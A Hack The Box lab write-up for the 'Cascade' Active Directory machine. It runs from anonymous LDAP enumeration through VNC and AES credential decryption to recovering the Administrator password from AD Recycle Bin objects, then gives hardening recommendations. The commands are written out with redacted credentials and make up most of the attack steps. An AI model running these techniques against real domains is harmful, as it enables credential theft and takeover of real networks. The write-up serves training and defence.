---
title: "Cascade — Anonymous LDAP Disclosure and AD Recycle Bin Credential Recovery"
description: "Anonymous LDAP disclosure, SMB configuration artifacts, audit-app analysis, and AD Recycle Bin data combine into a credential-exposure chain."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ldap
objective: "Enumerate anonymously exposed domain data, validate recovered account access, and reach administrative control through AD Recycle Bin data."
tools:
  - nmap
  - ldapsearch
  - NetExec
  - smbclient
  - sqlite3
  - openssl
  - evil-winrm
skill: "Credential discovery through LDAP, SMB, and AD Recycle Bin data"
outcome: "Administrative domain access via a password recovered from a deleted AD object"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server 2008 R2 Active Directory domain controller |
| Starting position | Unauthenticated network access |
| Objective | Enumerate anonymously exposed domain data, validate recovered account access, and reach administrative control through AD Recycle Bin data |
| Outcome | Low-privileged domain access, then administrative access via a password recovered from a deleted AD object |

## Anonymous LDAP to Recycle Bin credential recovery

Cascade is a Medium-rated Hack The Box Active Directory lab built on credential exposure rather than a single exploitable flaw. Anonymous LDAP enumeration discloses a custom credential-like attribute; an SMB-readable share exposes a VNC configuration export and an audit application whose stored credentials can be reversed; and the AD Recycle Bin retains a deleted account whose password equals the domain Administrator's. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Anonymous LDAP enumeration → Base64 legacy-attribute decode → SMB access → VNC config DES decryption → `Audit$` share → .NET static analysis and AES key recovery → service-account access → AD Recycle Bin deleted-object query → Administrator**

## Domain controller, anonymous start, and enumeration goal

- **Target:** a Windows Server 2008 R2 domain controller (`<DC_HOST>`) for the `<DOMAIN>` domain, exposing DNS, Kerberos, LDAP, SMB, and RPC.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** enumerate anonymously readable directory data, validate any recovered account access, and establish whether the resulting permissions lead to administrative control.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: anonymous LDAP to Recycle Bin disclosure

### 1. Service Enumeration

Observation: a full TCP scan identifies the domain controller's service surface.

```bash
nmap -sC -sV -p- -Pn -T4 -oA <OUT_PREFIX> <TARGET_IP>
```

Result: the scan identified DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (139/445), and RPC (135), and resolved the domain controller `<DC_HOST>` in the `<DOMAIN>` domain. No credential is required to reach LDAP.

### 2. Anonymous LDAP Enumeration and Legacy Attribute

Observation: LDAP accepts an anonymous bind, and the returned user objects expose a non-standard `cascadeLegacyPwd` attribute.

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b "DC=<DOMAIN_PART>,DC=<TLD>" \
  "(objectClass=user)" > ldap_users.txt
```

The dump contains the custom attribute on a user object:

```text
sAMAccountName: <LAB_USER>
cascadeLegacyPwd: <ENCODED_LEGACY_PASSWORD_1>
```

Action: decode the Base64 value and validate the credential over SMB.

```bash
base64 -d <<< '<ENCODED_LEGACY_PASSWORD_1>'
nxc smb <DOMAIN> -u '<LAB_USER>' -p '<LDAP_PASSWORD>'
```

```text
[+] <DOMAIN>\<LAB_USER>:<LDAP_PASSWORD>
```

Significance: pre-Windows 2000 compatible access permitted anonymous directory reads, and the password was stored as Base64, an encoding with no protection, so it was trivially recoverable.

Result: the recovered credential authenticates over SMB as a low-privileged domain user.

### 3. SMB Share Access and VNC Password Recovery

Observation: the first account can read the `Data` share, which contains an IT directory including a VNC installation registry export.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LDAP_PASSWORD>' --shares
smbclient //<TARGET_IP>/Data -U '<LAB_USER>%<LDAP_PASSWORD>' \
  -c 'recurse ON; prompt OFF; mget *'
```

The share is readable:

```text
Data   READ
```

The download includes the registry export:

```text
./IT/Temp/<SMB_USER>/VNC Install.reg
```

That export stores a VNC password in its proprietary hex format:

```text
"Password"=hex:<VNC_HEX_VALUE>
```

Action: decrypt it with VNC's documented static DES key, then validate the recovered credential over SMB.

```bash
printf '%s' '<VNC_HEX_VALUE>' | xxd -r -p | \
  openssl enc -des-cbc --nopad --nosalt -K <VNC_STATIC_KEY> \
  -iv <ZERO_IV> -d | hexdump -Cv
nxc smb <DOMAIN> -u '<SMB_USER>' -p '<VNC_PASSWORD>'
```

```text
[+] <DOMAIN>\<SMB_USER>:<VNC_PASSWORD>
```

Significance: VNC's stored-password scheme uses a static, publicly documented DES key, so any readable configuration export exposes the credential.

Result: a second domain account is recovered and validated.

### 4. Audit Application Static Analysis

Observation: the second account can read the `Audit$` share, which holds a .NET audit executable, its crypto library, and a SQLite database.

```bash
nxc smb <TARGET_IP> -u '<SMB_USER>' -p '<VNC_PASSWORD>' --shares
smbclient //<TARGET_IP>/Audit$ -U '<SMB_USER>%<VNC_PASSWORD>' \
  -c 'recurse ON; prompt OFF; mget *'
```

```text
Audit$   READ
```

```text
CascAudit.exe
CascCrypto.dll
DB/Audit.db
```

The database's `Ldap` table stores a service-account value:

```bash
sqlite3 Audit.db "SELECT * FROM Ldap;"
```

```text
1|<SERVICE_ACCOUNT>|<CIPHERTEXT>|<DOMAIN>
```

Static review of the executable and its library shows the value is AES-CBC encrypted with a hard-coded key and IV:

```python
# Representative decryption pattern; original key, IV, and ciphertext redacted.
from Crypto.Cipher import AES
import base64

cipher = AES.new(b"<AES_KEY>", AES.MODE_CBC, b"<AES_IV>")
plaintext = cipher.decrypt(base64.b64decode("<CIPHERTEXT>"))
```

Action: decrypt the stored value with the recovered key material and validate the service account.

```bash
nxc smb <DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_PASSWORD>'
evil-winrm -i <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_PASSWORD>'
```

```text
[+] <DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_PASSWORD>
```

Significance: embedding the decryption key beside the ciphertext in the same application removes the protection the encryption provides; anyone who can read the binaries and database can recover the secret.

Result: the service account's credentials are recovered and validated. The source records a WinRM session opened as that account, which belongs to the AD Recycle Bin group; I could not verify that session from the material available.

### 5. AD Recycle Bin Abuse

Observation: a recycling log in the `Data` share showed that accounts, including a temporary administrator, had been deleted. When the AD Recycle Bin feature is enabled, deleted objects retain all their attributes.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' \
  -IncludeDeletedObjects -Property * |
  Select sAMAccountName, cascadeLegacyPwd
```

```text
sAMAccountName : <DELETED_TEMP_ADMIN>
cascadeLegacyPwd : <ENCODED_LEGACY_PASSWORD_2>
```

Action: decode the retained attribute and validate the resulting credential as the domain Administrator.

```bash
base64 -d <<< '<ENCODED_LEGACY_PASSWORD_2>'
nxc smb <DOMAIN> -u '<ADMIN_ACCOUNT>' -p '<RECOVERED_PASSWORD>'
```

```text
[+] <DOMAIN>\<ADMIN_ACCOUNT>:<RECOVERED_PASSWORD> (Pwn3d!)
```

Significance: the deleted temporary administrator had been created with the same password as the domain Administrator, which was never rotated, so the retained attribute was still a live administrative secret.

Result: the recovered password authenticates as the domain Administrator.

## Correlating the deleted object and Recycle Bin retention

- **Linking the deleted object to the current Administrator.** The deleted object alone exposed only a legacy attribute; I checked the `ArkAdRecycleBin.log` against the meeting-notes file in the `Data` share, which established that the temporary administrator had been created with the same password as the normal administrator. That correlation, not a distinct exploit, connected the recovered value to administrative access.
- **Recycle Bin retention.** Because the feature preserves all attributes of deleted objects until the tombstone lifetime expires, a credential-bearing attribute that should have been destroyed remained queryable.

## Outcome: administrative access from retained object data

SMB authentication returning an administrative marker confirms the transition from authenticated low-privileged domain access to administrative access on the domain controller. Every credential in the chain came from data readable by a lower-privileged account or retained on a deleted object, and the final escalation depended on password reuse between the deleted temporary administrator and the current domain Administrator. Flag values are omitted.

## Recommendations: anonymous LDAP, custom attributes, VNC, keys, and deleted objects

The actions below are recommendations derived from the observed weaknesses; this case study did not test them.

1. **Anonymous LDAP disclosure.** Pre-Windows 2000 compatible access left directory objects readable without authentication, exposing a credential-bearing attribute. *Recommendation:* remove `Anonymous`/`Everyone` from the Pre-Windows 2000 Compatible Access group and require authentication for directory reads. *Validation:* an anonymous `ldapsearch` should return only `rootDSE` data.
2. **Secrets in custom directory attributes.** A reusable password was stored in a custom attribute as Base64. *Recommendation:* never store credentials in directory schema extensions; inventory custom attributes and restrict their ACLs.
3. **VNC stored password.** The encrypted value used a static, publicly documented DES key, so a readable configuration export exposed the credential. *Recommendation:* avoid maintaining VNC passwords on disk and rotate any password that has been stored this way.
4. **Hard-coded application key.** The audit application embedded the AES key and IV beside the encrypted value, making decryption trivial for anyone who could read its binaries and database. *Recommendation:* move secrets to managed storage and rotate the embedded key. *Detection:* scan binaries and build artifacts for embedded key material.
5. **Sensitive attributes on deleted objects.** AD Recycle Bin preserved the deleted account's credential attribute, and the retained password still matched the current Administrator. *Recommendation:* clear sensitive attributes before deleting an account, rotate privileged credentials when temporary administrator accounts are retired, and restrict membership of the AD Recycle Bin group.

## References

- [Hack The Box — Cascade](https://app.hackthebox.com/machines/Cascade) (retired machine)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [ldapsearch — OpenLDAP manual](https://www.openldap.org/software/man.cgi?query=ldapsearch)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB authentication and share enumeration)
- [SQLite command-line shell](https://www.sqlite.org/cli.html)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Active Directory Recycle Bin (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)
- [[MS-ADTS] Pre-Windows 2000 Compatible Access Group Object (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5)
- [Anonymous LDAP operations to Active Directory are disabled (Microsoft Learn)](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/anonymous-ldap-operations-active-directory-disabled)
